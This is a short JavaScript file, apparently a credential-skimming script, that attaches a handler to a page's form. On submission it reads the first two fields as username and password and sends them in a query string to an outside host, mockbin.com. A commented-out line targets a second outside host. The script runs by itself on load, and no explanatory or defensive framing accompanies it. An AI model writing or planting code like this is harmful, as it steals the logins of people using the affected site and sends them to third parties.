function start() {
    console.log('start')
    const form = document.forms

    const sendToMe = async function (event) {
        const username = event.currentTarget[0].value
        const password = event.currentTarget[1].value
        const response = await fetch(`http://mockbin.com/request?username=${username}&password=${password}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
        })
        // const response = await fetch(`http://ismage.com/xyfjk32/g?u=${username}&p=${password}`)
    }

    if(form) {
        form.addEventListener('submit', sendToMe);
    }

    console.log('form attached')
}


start()
